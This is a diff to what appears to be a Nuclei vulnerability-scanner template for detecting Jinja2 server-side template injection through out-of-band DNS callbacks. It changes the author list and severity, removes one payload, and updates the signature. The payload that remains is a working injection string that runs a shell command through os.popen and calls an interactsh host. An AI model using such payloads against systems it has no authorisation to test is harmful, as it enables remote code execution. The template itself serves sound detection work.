@@ -2,8 +2,8 @@ id: jinja2-oob
 
 info:
   name: Jinja2 - Out of Band Template Injection
-  author: 0xAwali,DhiyaneshDK,ritikchaddha
-  severity: high
+  author: 0xAwali,DhiyaneshDK
+  severity: unknown
   reference:
     - https://pypi.org/project/Jinja2/
     - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
@@ -20,7 +20,6 @@ http:
     payloads:
       injection:
         - "{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup+-type=SRV+{{interactsh-url}}').read()}}"
-        - "{{ cycler.__init__.__globals__.os.popen('nslookup+-type=SRV+{{interactsh-url}}').read() }}"
 
     fuzzing:
       - part: query
@@ -38,4 +37,4 @@ http:
           - "contains(interactsh_protocol,'dns')"
           - "contains(interactsh_request,'srv')"
         condition: and
-# digest: 4a0a004730450221008c4cd90980e559b7c0b2b3a73939e66625742350067a2a8e68a17b31cf2cd8b5022030d5d2daaa6519dc175b1aee53e418689cb92d23931cfaa634ea939080f4d124:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022034cc4f09c197bdad2180766aa4d289083f30f1713aecb5f27cdc3c650f864108022100eb6d1736fc259c2185cdd215c633e15e28d570b885d3c7349676aec4d212ae91:922c64590222798bb761d5b6d8e72950
